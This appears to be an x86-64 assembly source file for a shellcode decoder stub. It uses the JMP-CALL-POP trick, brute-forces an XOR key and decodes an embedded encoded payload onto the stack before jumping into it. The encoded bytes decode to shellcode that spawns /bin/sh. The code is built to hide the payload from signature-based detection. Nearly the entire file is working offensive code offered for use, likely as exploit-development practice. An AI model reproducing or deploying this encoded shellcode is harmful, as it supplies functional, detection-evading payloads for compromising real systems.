global _start

section .text
_start:
    jmp short shelly ; JMP CALL POP trick

stub:
    pop rsi; address of shellcode in memory 
    xor rcx, rcx ; bytes counter 
    xor rax, rax ; rax = 0

findkey:
    inc rcx     ; rcx loops every possible byte. 
    push rcx    ; save rcx so it can be restored later
    xor cl, byte [rsi] ; xor cl with the byte pointed by rsi, in other words, with the shellcode byte
    cmp cl, 0x90 ; if cl != 0x90 
    pop rcx      ; restore rcx 
    jne findkey  ; try next byte
    
    ;ELSE key found
    
    mov al, cl ; al stores the correct key     
    mov al, cl 
    mov ah, cl 
    mov bx, ax 
    rol rax, 0x10 
    mov ax, bx  ; each byte of RAX is a the byte-key
    rol rax, 0x10
    mov ax, bx 
    rol rax, 0x10
    mov ax, bx 


    mov cl, len ; cl keeps the length of the shellcode and acts as LOOP decreasing counter 
    

    add rsi, rcx ; esi stores the shellcode length 
    dec rsi 
    dec rcx ; prepare RCX 
decode:
    sub rsi, 0x8
    sub rcx, 0x7 ; 7 because loop already decreses 









    mov rbx, rax        ; save the key  
    xor rax, [rsi]      ; decrypt 4 bytes and save it in EAX
    push rax            ; save decrypted bye
    mov rax, rbx        ; restore the key 
    loop decode         ; decrypt until ECX = 0  
    call rsp  ; execute the decrypted shellcode! 
    
shelly:
    call stub
   ; pase below the encoded bytes with encoder.py 0x28
   shellcode: db 0x5e,0x9e,0x86,0xff,0x1c,0x86,0xff,0x38,0x86,0x75,0xe1,0xac,0xa7,0xa0,0xe1,0xe1,0xbd,0xa6,0x9d,0x9a,0x91,0x7e,0xf5,0xc1,0xcb,0x5e,0x5e,0x5e,0x5e,0x5e,0x5e,0x5e,0xce 
    len equ $-shellcode 
